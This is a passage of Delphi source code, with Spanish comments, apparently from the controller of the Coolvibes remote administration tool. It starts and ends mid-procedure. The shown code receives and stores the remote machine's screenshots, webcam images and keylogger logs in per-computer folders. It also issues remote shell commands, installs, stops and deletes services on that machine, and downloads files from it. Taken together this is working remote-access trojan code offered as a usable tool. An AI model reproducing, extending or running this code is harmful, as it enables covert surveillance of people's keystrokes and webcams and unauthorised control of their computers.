      Size     := MyGetFileSize(FilePath);
      Descarga := TDescargaHandler.Create(Athread, FilePath, Size, '',
      ListViewDescargas, False);
      Descarga.UploadFile;
    end;
  end
  else if Copy(PChar(Buffer), 1, 9) = 'CAPSCREEN' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
    AnchuraPantalla := strtoint(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
    Delete(FilePath, 1, Pos('¬', FilePath));
    AlturaPantalla := strtoint(FilePath);
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Trim(Buffer));
    BtnCapturarScreen.Enabled := False;
    MS := TMemoryStream.Create;
    MS.Position := 0;
    GenericBar := ProgressBarScreen;
    ObtenerScreenCap_CamCap(AThread, Size, MS);
    MS.Position := 0;
    JPG := TJPEGImage.Create;
    JPG.LoadFromStream(MS);
    if FormVisorCaptura <> nil then
    begin
      (FormVisorCaptura as TScreenMax).ImgCaptura.Picture.Assign(JPG)
    end
    else
    begin
      imgCaptura.Width := JPG.Width; //Establecemos ancho
      imgCaptura.Height := JPG.Height; //Establecemos alto
      imgcaptura.Picture.Assign(JPG);
    end; 
    LabelTamano.Caption := IntToStr(MS.Size div 1024); //Es interesante saber el tamaño
    if(PrefijoGuardarCaptura <> '') then
    begin
      InumeroCaptura := InumeroCaptura+1;
      CrearDirectoriosUsuario();
      while FileExists(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg') do
        PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
      MS.SaveToFile(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg');
    end;
    MS.Free;
    JPG.Free;
    BtnCapturarScreen.Enabled := True;
    RecibiendoJPG := false;
  end
  else if Copy(PChar(Buffer), 1, 13) = 'CAPTURAWEBCAM' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    //FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
    //AnchuraWebCam := StrToInt(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
    //Delete(FilePath, 1, Pos('¬', FilePath));
    //AlturaWebCam := StrToInt(FilePath);
    Delete(Buffer, 1, Pos('|', Buffer));
		Size := StrToInt(Trim(Buffer));
		BtnCapturarWebcam.Enabled := False;	
    MS := TMemoryStream.Create;
    MS.Position := 0;
    GenericBar := ProgressBarWebCam;
    ObtenerScreenCap_CamCap(AThread, Size, MS);
    MS.Position := 0;
    JPG := TJPEGImage.Create;
    JPG.LoadFromStream(MS);
    imgWebcam.Width := JPG.Width; //Establecemos ancho
    imgWebcam.Height := JPG.Height; //Establecemos alto
    imgWebcam.Picture.Assign(JPG);
    StatusBar.Panels[1].Text := IntToStr(MS.Size div 1024)+'KB'; //Es interesante saber el tamaño
    if(PrefijoGuardarWebcam <> '') then
    begin
      InumeroWebcam := InumeroWebcam+1;
      CrearDirectoriosUsuario();
      while FileExists(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg') do
        PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
      MS.SaveToFile(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg');
    end;
    MS.Free;
    JPG.Free;
		BtnCapturarWebcam.Enabled := True;
    RecibiendoJPG := false;
  end
  else if Copy(PChar(Buffer), 1, 9) = 'THUMBNAIL' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Trim(Buffer));  //Tamaño del Thumbnail
    GenericBar := (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail;
    MS := TMemoryStream.Create;
    MS.Position := 0;
    ObtenerScreenCap_CamCap(AThread, Size, MS);
    MS.Position := 0;
    if(MS.Size <> 1) then //si es =1 es que ha habido un error
    begin
      JPG := TJPEGImage.Create;
      JPG.LoadFromStream(MS);
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).imageThumnail.picture.Assign(JPG);
      JPG.Free;
    end
    else
    begin
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).StatusBar.panels[3].text := _('Error al generar el thumbnail');
    end;
    MS.Free;

    RecibiendoJPG := false;
    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
  end
  else if Copy(PChar(Buffer), 1, 12) = 'KEYLOGGERLOG' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
    GenericBar := ProgressBarKeylogger;
    //StatusBar.Panels[1].Text := inttostr(size)+'B'; //Es interesante saber el tamaño
    ObteneryAniadirKeyloggerLog(AThread, Size); //lo obtenemos y añadimos al richedit
    SpeedButtonRecibirLog.Enabled := true;
    RecibiendoJPG := false;
  end;
end;

procedure TFormControl.ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
var
  RecibidoTotal  : integer;
  buffSize       : integer;
  LineaNueva     : ansistring;
  UltimaLinea    : boolean;
  i              : integer;
begin
  if(filesize = 0) then exit;
  RichEditKeylogger.clear;
  pctProgressBarScreen := 0;
  Athread.Synchronize(UpdateProgressBarScreen);
  RecibidoTotal := 0;
  try
    while (RecibidoTotal < filesize) and (Athread.Connection.Connected) do
    begin
      LineaNueva := Athread.Connection.ReadLn;
      RecibidoTotal := RecibidoTotal + Length(LineaNueva)+2;
      if (Copy(LineaNueva, 1, 2) = '-[') then //evento
      begin
         RichEditKeylogger.SelAttributes.Style := [fsBold];
         RichEditKeylogger.SelAttributes.Color := clRed;
      end
      else if (Copy(LineaNueva, 1, 2) = '-{') then
      begin
         RichEditKeylogger.SelAttributes.Style := [fsBold];
         RichEditKeylogger.SelAttributes.Color := clgreen;
      end
      else
      begin
         RichEditKeylogger.SelAttributes.Style := [];
         RichEditKeylogger.SelAttributes.Color := clblack;
      end;
      if not (RecibidoTotal < Filesize) then ultimalinea := true;

      if((not ultimalinea)) then
        RichEditKeylogger.SelText :=LineaNueva+#13+#10
      else
      if((ultimalinea)) then
        RichEditKeylogger.SelText :=LineaNueva;
      pctProgressBarScreen := Round((RecibidoTotal * 100) / FileSize);
      Athread.Synchronize(UpdateProgressBarScreen);
    end;
  finally
    CreardirectoriosUsuario();


    while fileexists(extractfilepath(Paramstr(0))+'Usuarios\'+NombrePC+'\Klog'+inttostr(i)+'.txt') do
      i := i+1;

    RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
    RichEditKeylogger.lines.savetofile(extractfilepath(Paramstr(0))+'Usuarios\'+NombrePC+'\Klog'+inttostr(i)+'.txt');
  end;//end de finally
end;


function TFormControl.ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64;var MS: TmemoryStream):string;
var
  Buffer: array[0..1023] of byte;
  Read, currRead: integer;
  buffSize: integer;
begin
  Read     := 0;
  currRead := 0;
  pctProgressBarScreen := 0;
  Athread.Synchronize(UpdateProgressBarScreen);
  buffSize := SizeOf(Buffer);
  try
    while (Read < FileSize) and (Athread.Connection.Connected) do
    begin
      if (FileSize - Read) >= buffSize then
        currRead := buffSize
      else
        currRead := (FileSize - Read);

      Athread.Connection.ReadBuffer(buffer, currRead);
      Read := Read + currRead;
      //BlockWrite(F, Buffer, currRead);

      MS.Write(Buffer, currRead);
      pctProgressBarScreen := Round((Read * 100) / FileSize);
      Athread.Synchronize(UpdateProgressBarScreen);
    end;
  finally
   // CloseFile(F);
    {Athread.Data := nil;
    Athread.Connection.Disconnect;    }
  end;//end de finally
end;
 //se llama cada vez que finaliza una descarga para que se inicie
 //alguna otra descarga que haya sido puesta en cola
procedure TFormControl.TransferFinishedNotification(Sender: TObject;filename:string);
var
  Descarga: TDescargaHandler;
  i: integer;
begin

  if(AnsiLowerCase(extractfilename(filename)) = 'thumbs.db') then
  begin
    CargarThumbsFileAlListview(extractfilepath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\thumbs.db');//cargamos las miniaturas
    Receivingthumbfile := false;
  end
  else
  begin

    Statusbar.panels[1].text := _('Transferencia finalizada: ')+extractfilename(filename);
  end;
  if not Servidor.Terminated and Servidor.Connection.Connected then
  begin
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if not Descarga.Transfering and not Descarga.cancelado and not
        Descarga.Finalizado and Descarga.es_descarga then //en espera
      begin
        Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
          '|' + IntToStr(Descarga.Descargado));
        Exit;
      end;
    end;
  end;
end;


procedure TFormControl.UpdateProgressBarScreen;
begin
  GenericBar.Position := pctProgressBarScreen;
  if(GenericBar.position = 100) then
    GenericBar.position := 0;//La reiniciamos
end;


procedure TFormControl.ListViewDescargasContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
var
  Descarga: TDescargaHandler;
begin
  if ListViewDescargas.Selected <> nil then
  begin
    Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
    if Descarga.Transfering then
    begin
      PopupDescargas.Items[0].Enabled := True;
      PopupDescargas.Items[1].Enabled := False;
      PopupDescargas.Items[2].Enabled := False;
      PopupDescargas.Items[3].Enabled := False;
      PopupDescargas.Items[4].Enabled := False;
      PopupDescargas.Items[5].Enabled := False;
      PopupDescargas.Items[7].Enabled := False;
      //Algún día conseguiremos que se pueda cancelar una descarga o subida
    end
    else if (not Descarga.Transfering) {AND (not Descarga.cancelado)} and
      (not Descarga.Finalizado) then //en espera o cancelado
    begin
      PopupDescargas.Items[0].Enabled := False;
      PopupDescargas.Items[1].Enabled := True;
      PopupDescargas.Items[2].Enabled := True;
      PopupDescargas.Items[3].Enabled := True;
      PopupDescargas.Items[4].Enabled := True;
      PopupDescargas.Items[5].Enabled := True;
      PopupDescargas.Items[7].Enabled := True;
    end
    else if Descarga.Finalizado then
    begin
      PopupDescargas.Items[0].Enabled := False;
      PopupDescargas.Items[1].Enabled := False;
      PopupDescargas.Items[2].Enabled := True;
      PopupDescargas.Items[3].Enabled := True;
      PopupDescargas.Items[4].Enabled := True;
      PopupDescargas.Items[5].Enabled := True;
      PopupDescargas.Items[7].Enabled := True;
    end;
  end;
  if (ListViewDescargas.Selected = nil) then
  begin
    PopupDescargas.Items[0].Enabled := False;
    PopupDescargas.Items[1].Enabled := False;
    PopupDescargas.Items[2].Enabled := False;
    PopupDescargas.Items[3].Enabled := False;
    PopupDescargas.Items[4].Enabled := False;
    PopupDescargas.Items[5].Enabled := False;
    PopupDescargas.Items[7].Enabled := False;
  end;

  //las subidas de archivo no se reanudan
  if not Descarga.es_descarga then
    PopupDescargas.Items[1].Enabled := False;

end;


//Popup eliminar descarga
procedure TFormControl.Eliminardescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
  i, j:     integer;
  TmpItem : Tlistitem;
begin
mslistviewitem := ListViewDescargas.Selected;
if mslistviewitem = nil then
  Exit;

while Assigned(mslistviewitem) do
begin

  if not TDescargaHandler(mslistviewitem.Data).Transfering then
  begin
   { TDescargaHandler(mslistviewitem.Data).ProgressBar.Free;
    TDescargaHandler(mslistviewitem.Data).Free;      }
    i := mslistviewitem.Index;
    tmpitem := mslistviewitem;  
    mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    tmpitem.Delete;

    for j := i to ListViewDescargas.Items.Count - 1 do
      //Si hay una progressbar subirla un puesto
      if ListViewDescargas.Items.Item[j].Data <> nil then
      begin
        Descarga := TDescargaHandler(ListViewDescargas.Items.Item[j].Data);
       { Descarga.ProgressBar.Top :=
          Descarga.ProgressBar.Top - (Descarga.ProgressBar.BoundsRect.Bottom -
          Descarga.ProgressBar.BoundsRect.Top);  }
      end;
  end;


end;
end;

//Popup borrar completados
procedure TFormControl.Borrarcompletados1Click(Sender: TObject);
var
  i, j:     integer;
  Descarga: TDescargaHandler;
begin
  {Lo recorremos en orden inverso sino al borrar el primer item, el resto se desplazaria hacia arriba y nos saldriamos del bucle}
  for i := ListViewDescargas.Items.Count - 1 downto 0 do
  begin
    Descarga := TDescargaHandler(ListViewDescargas.Items.Item[i].Data);
    if Descarga.Finalizado then
    begin  //Borrar el item descargado y subir todos hacia arriba
     // Descarga.ProgressBar.Free;
      ListViewDescargas.Items[i].Delete;
      Descarga.Free;
      //Mover los progressbar que halla por debajo hacia arriba
      for j := i to ListViewDescargas.Items.Count - 1 do
        //Si hay una progressbar subirla un puesto
        if ListViewDescargas.Items.Item[j].Data <> nil then
        begin
          Descarga := TDescargaHandler(ListViewDescargas.Items.Item[j].Data);
         { Descarga.ProgressBar.Top :=
            Descarga.ProgressBar.Top - (Descarga.ProgressBar.BoundsRect.Bottom -
            Descarga.ProgressBar.BoundsRect.Top); }
        end;
    end;
  end;
end;

//Subir al primer puesto
procedure TFormControl.Subiralprimerpuesto1Click(Sender: TObject);
var
  Item: TListItem;
  i, j: integer;
begin
  for i := 0 to ListViewDescargas.Items.Count - 1 do
    if ListViewDescargas.Items.Item[i].SubItems[0] = _('En espera') then
    begin
      if ListViewDescargas.ItemIndex = i then
        Exit;  //Es el primer item en espera no se puede subir más
      Item := TListItem.Create(ListViewDescargas.Items);
      Item.Assign(ListViewDescargas.Selected);
      for j := ListViewDescargas.Selected.Index downto i + 1 do
        ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j - 1];
      ListViewDescargas.Items.Item[i] := Item;
      ListViewDescargas.ItemIndex := i;
      Item.Free;
      break;
    end;
end;

//Subir un puesto
procedure TFormControl.Subir1Click(Sender: TObject);
var
  Item: TListItem;
  i:    integer;
begin
  if ListViewDescargas.ItemIndex = 0 then
    exit;  //Si es el primero...
  //Si su item superior está tambien en espera se intercambia con él
  i := ListViewDescargas.ItemIndex;
  if ListViewDescargas.Items.Item[i - 1].SubItems[0] = _('En espera') then
  begin
    Item := TListItem.Create(ListViewDescargas.Items);
    Item.Assign(ListViewDescargas.Selected);
    ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i - 1];
    ListViewDescargas.Items.Item[i - 1] := Item;
    ListViewDescargas.ItemIndex := i - 1;
    Item.Free;
  end;
end;

//Bajar un puesto
procedure TFormControl.Bajar1Click(Sender: TObject);
var
  Item: TListItem;
  i:    integer;
begin
  if ListViewDescargas.ItemIndex = ListViewDescargas.Items.Count - 1 then
    exit;  //Si es el último...
  //Si su item inferior está tambien en espera se intercambia con él
  i := ListViewDescargas.ItemIndex;
  if ListViewDescargas.Items.Item[i + 1].SubItems[0] = _('En espera') then
  begin
    Item := TListItem.Create(ListViewDescargas.Items);
    Item.Assign(ListViewDescargas.Selected);
    ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i + 1];
    ListViewDescargas.Items.Item[i + 1] := Item;
    ListViewDescargas.ItemIndex := i + 1;
    Item.Free;
  end;
end;

//Bajar al ultimo puesto
procedure TFormControl.ltimopuesto1Click(Sender: TObject);
var
  Item: TListItem;
  i, j: integer;
begin
  //Buscamos el último item en espera y le insertamos ahi
  for i := ListViewDescargas.Items.Count - 1 downto 0 do
    if ListViewDescargas.Items.Item[i].SubItems[0] = _('En espera') then
    begin
      if ListViewDescargas.ItemIndex = i then
        Exit;  //Es el último item en espera no se puede bajar más
      Item := TListItem.Create(ListViewDescargas.Items);
      Item.Assign(ListViewDescargas.Selected);
      for j := i + 1 to ListViewDescargas.Selected.Index do
        ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j + 1];
      ListViewDescargas.Items.Item[i] := Item;
      ListViewDescargas.ItemIndex := i;
      Item.Free;
      break;
    end;
end;

procedure TFormControl.Activar2Click(Sender: TObject);
begin
  MemoShell.lines.clear;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('SHELL|ACTIVAR')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;


procedure TFormControl.ComboBoxShellCommandKeyPress(Sender: TObject; var Key: char);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;

  if Key = #13 then
  begin
    if Lowercase(ComboBoxShellCommand.Text) = 'cls' then
      MemoShell.Text := '';
    MemoShell.Text := Trim(MemoShell.Text);
    
    Servidor.Connection.Writeln('SHELL|' + ComboBoxShellCommand.Text);

    //Agrega el comando que acabo de escribir a la lista de comandos del combobox
    if ComboBoxShellCommand.Items.Count > 0 then //inserta un item de primero en la lista
    begin
      if ComboBoxShellCommand.Text <> ComboBoxShellCommand.Items[0] then
        ComboBoxShellCommand.Items.Insert(0, ComboBoxShellCommand.Text);
    end
    else
      ComboBoxShellCommand.Items.Add(ComboBoxShellCommand.Text);
    //limpiar comando
    ComboBoxShellCommand.Text := '';
  end;
end;

procedure TFormControl.BtnCambiarFuenteShellClick(Sender: TObject);
begin
  if DlgFont.Execute then
  begin
    MemoShell.Font := DlgFont.Font;
    ComboBoxShellCommand.Font := DlgFont.Font;
    if MemoShell.Color = MemoShell.Font.Color then
      MessageBox(Handle,
        Pchar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
        Pchar(_('Advertencia')), 0 + MB_IconWarning);
  end;
end;

procedure TFormControl.BtnCambiarColorShellClick(Sender: TObject);
begin
  if DlgColors.Execute then
  begin
    MemoShell.Color := DlgColors.Color;
    ComboBoxShellCommand.Color := DlgColors.Color;
    if MemoShell.Color = MemoShell.Font.Color then
      MessageBox(Handle,
        Pchar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
        Pchar(_('Advertencia')), 0 + MB_IconWarning);
  end;
end;

procedure TFormControl.PopupShellPopup(Sender: TObject);
begin
  Activar2.Enabled    := not ComboBoxShellCommand.Enabled;
  Desactivar2.Enabled := ComboBoxShellCommand.Enabled;
end;

procedure TFormControl.Desactivar2Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('SHELL|DESACTIVAR')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;


procedure TFormControl.Guardarcmo1Click(Sender: TObject);
begin
  DlgGuardar.Title      := _('Guardar texto :: Coolvibes ::');
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter     := _('Archivo de texto')+' (*.txt)|*.txt';
  DlgGuardar.DefaultExt := 'txt';
  if DlgGuardar.Execute then
  begin
    MemoShell.Lines.SaveToFile(DlgGuardar.FileName);
    StatusBar.Panels[1].Text := _('Archivo guardado como: ') + DlgGuardar.FileName;
  end;
end;

procedure TFormControl.BtnServiciosClick(Sender: TObject);
begin
  BtnServicios.enabled := false;
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;
  ListViewServicios.Clear;
  Servidor.Connection.Writeln('LISTARSERVICIOS');
end;

procedure TFormControl.DEtener1Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;
  Servidor.Connection.Writeln('DETENERSERVICIO' + ListViewServicios.Selected.Caption);
end;

procedure TFormControl.Iniciar1Click(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;

   mslistviewitem := ListViewServicios.Selected;
   while Assigned(mslistviewitem) do
   begin
      Servidor.Connection.Writeln('INICIARSERVICIO' + mslistviewitem.Caption);
      mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;
end;

procedure TFormControl.Desinstalar1Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;
  
  mslistviewitem := ListViewServicios.Selected;
   while Assigned(mslistviewitem) do
   begin
      Servidor.Connection.Writeln('BORRARSERVICIO' + mslistviewitem.Caption);
      mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;
end;

procedure TFormControl.Instalar1Click(Sender: TObject);
begin
  btnSiguienteInstalarServicio.Visible := True;
  BtnCancelarInstalarServicio.Visible := True;
  MultiEditInstalarServicio.Visible := True;
  MultiEditInstalarServicio.Text := _('{Escribir el nombre del servicio}');
end;

procedure TFormControl.BtnCancelarInstalarServicioClick(Sender: TObject);
begin
  btnSiguienteInstalarServicio.Visible := False;
  BtnCancelarInstalarServicio.Visible := False;
  MultiEditInstalarServicio.Visible := False;
  btnInstServicios.Visible  := False;
  btnInstServicios2.Visible := False;
end;

procedure TFormControl.btnSiguienteInstalarServicioClick(Sender: TObject);
begin
  NombreSI := MultiEditInstalarServicio.Text;
  MultiEditInstalarServicio.Text := _('{Escribir la descripción del servicio}');
  btnSiguienteInstalarServicio.Visible := False;
  btnInstServicios.Visible := True;
end;

procedure TFormControl.btnInstServiciosClick(Sender: TObject);
begin
  descripcionSI := MultiEditInstalarServicio.Text;
  MultiEditInstalarServicio.Text := _('{Ruta del ejecutable a poner de servicio}');
  btnInstServicios.Visible := False;
  btnInstServicios2.Visible := True;
end;

procedure TFormControl.btnInstServicios2Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;
  RutaSI := MultiEditInstalarServicio.Text;
  Servidor.Connection.Writeln('INSTALARSERVICIO' + nombresi + '|' +
    descripcionSI + '|' + rutaSi + '|');
  btnSiguienteInstalarServicio.Visible := False;
  BtnCancelarInstalarServicio.Visible := False;
  MultiEditInstalarServicio.Visible := False;
  btnInstServicios.Visible  := False;
  btnInstServicios2.Visible := False;
end;

procedure TFormControl.PopupDescargasPopup(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
  if ListViewDescargas.Selected = nil then
    Exit;
  Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
  if not Descarga.Transfering then
    PopUpDescargas.Items[0].Enabled := False; //menu Detener descarga
  if Descarga.cancelado then
    PopUpDescargas.Items[1].Enabled := True;
end;

procedure TFormControl.DetenerDescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
   mslistviewitem := ListViewDescargas.Selected;
   if mslistviewitem = nil then
    Exit;

   while Assigned(mslistviewitem) do
   begin
        Descarga := TDescargaHandler(mslistviewitem.Data);
        Descarga.CancelarDescarga;
      mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;

end;

procedure TFormControl.ReanudarDescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;

  mslistviewitem := ListViewDescargas.Selected;
   if mslistviewitem = nil then
    Exit;

   while Assigned(mslistviewitem) do
   begin
        Descarga := TDescargaHandler(mslistviewitem.Data);
        Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
    '|' + IntToStr(Descarga.Descargado));
      mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;


end;

procedure TFormControl.Agregaracoladedescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
  FilePath: ansistring;
  Size:     integer;
begin
    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
      mslistviewitem := ListViewArchivos.Selected
    else
      mslistviewitem := ListViewBuscar.Selected;
      
   if mslistviewitem = nil then Exit;

   CrearDirectoriosUsuario();
   while Assigned(mslistviewitem) do
   begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        FilePath := EditPathArchivos.Text + mslistviewitem.Caption
      else
        FilePath := mslistviewitem.Caption;
      Size     := StrToInt(mslistviewitem.SubItems.Strings[4]);
      Descarga := TDescargaHandler.Create(nil, FilePath, Size,
      ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\' +
      ExtractFileName(FilePath), ListViewDescargas, True);
      Descarga.callback := Self.TransferFinishedNotification;
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
      else
        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;
end;

procedure TFormControl.EditPathArchivosKeyPress(Sender: TObject; var Key: char);
begin
  if (key = #13) then
  begin
    EditPathArchivos.Text := Trim(EditPathArchivos.Text);
    Self.BtnActualizarArchivos.Click;
  end;
end;

//El evento OnClick es igual para todos los listviews
procedure TFormControl.ListViewProcesosColumnClick(Sender: TObject;
  Column: TListColumn);
begin
  Columna := Column.Index;
  (Sender as TListView).AlphaSort;
  if Columna <> ColumnaOrdenada then   //Para acordarnos por que columna está ordenado
    ColumnaOrdenada := Columna
  else
    ColumnaOrdenada := -1;
end;

//Este evento lo comparten varios ListViews, aquellos que en la columna 0 y 2 sean cadenas y la 1 sea un numero
procedure TFormControl.ListViewProcesosCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: integer; var Compare: integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
  begin
    Str1 := Item1.Caption;
    Str2 := Item2.Caption;
  end
  else
  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
    if Item1.SubItems.Count < Columna then
      Str1 := ''
    else
      Str1 := Item1.SubItems[Columna - 1];
    if Item2.SubItems.Count < Columna then
      Str2 := ''
    else
      Str2 := Item2.SubItems[Columna - 1];
  end;
  if Columna in [0, 2] then  //Son tratadas como cadenas
    Compare := CompareText(Str1, Str2)
  else  //Columna 1, PID
    Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
  //Si la columna ya fue ordenada anteriormente, invertir el orden
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1; //Invertimos el resultado
  (Sender as TListView).SetFocus;
end;

//Para el registro y los servicios las 3 columnas son cadenas
procedure TFormControl.ListViewRegistroCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: integer; var Compare: integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
  begin
    Str1 := Item1.Caption;
    Str2 := Item2.Caption;
  end
  else
  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
    if Item1.SubItems.Count < Columna then
      Str1 := ''
    else
      Str1 := Item1.SubItems[Columna - 1];
    if Item2.SubItems.Count < Columna then
      Str2 := ''
    else
      Str2 := Item2.SubItems[Columna - 1];
  end;
  Compare := CompareText(Str1, Str2);
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1;
end;

//Para ordenar ficheros
procedure TFormControl.ListViewArchivosCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: integer; var Compare: integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
  begin
    Str1 := Item1.Caption;
    Str2 := Item2.Caption;
  end
  else
  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
    if Item1.SubItems.Count < Columna then
      Str1 := ''
    else
      Str1 := Item1.SubItems[Columna - 1];
    if Item2.SubItems.Count < Columna then
      Str2 := ''
    else
      Str2 := Item2.SubItems[Columna - 1];
  end;

  if Item1.Caption = '<..>' then  //Siempre arriba
  begin
    Compare := Low(integer);  //El minimo valor posible de un Integer
    exit;
  end;
  case Columna of
    0:
    begin
      Compare := CompareText(Str1, Str2);
    end;
    1: Compare := ObtenerMejorUnidadInv(Str1) - ObtenerMejorUnidadInv(Str2);
    2: Compare := CompareText(Str1, Str2);
    3: Compare := CompareText(Str1, Str2);
    4: Compare := Round(StrToDateTime(Str1) - StrToDateTime(Str2));
  end;
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1;
end;

procedure TFormControl.Iralproceso1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    if ListViewVentanas.Selected = nil then
      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
    else                         //Recibe el PID de la ventana con Handle
      Servidor.Connection.Writeln('WINPROC|' + ListViewVentanas.Selected.SubItems[0]);
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.SpinCaptureScreenChange(Sender: TObject);
begin
  try
    if SpinCaptureScreen.Value < 0 then
      SpinCaptureScreen.Value := 0;
    if SpinCaptureScreen.Value > 30 then
      SpinCaptureScreen.Value := 30;
      TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+250;
  except
  end;
end;


procedure TFormControl.CheckBoxAutoCapturaScreenClick(Sender: TObject);
begin
  if Self.CheckBoxAutoCapturaScreen.Checked then
  begin
    BtnCapturarScreen.click; //Hacemos la primera captura
  end;

  TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+250;
  TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked;
  TabScreenCap.Highlighted := TimerCaptureScreen.Enabled; //Para no olvidarnos que lo tenemos activo
end;


procedure TFormControl.Previsualizarjpg1Click(Sender: TObject);
var
  i: integer;
  Descarga: TDescargaHandler;
  FilePath: ansistring;
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
    exit;
  end;
  
  if PageControlArchivos.ActivePage = TabSheetVerArchivos then
    mslistviewitem := ListViewArchivos.Selected
  else
    mslistviewitem := ListViewBuscar.Selected;

  while Assigned(mslistviewitem) do
  begin
    if (FormVisorDeMiniaturas = nil) then
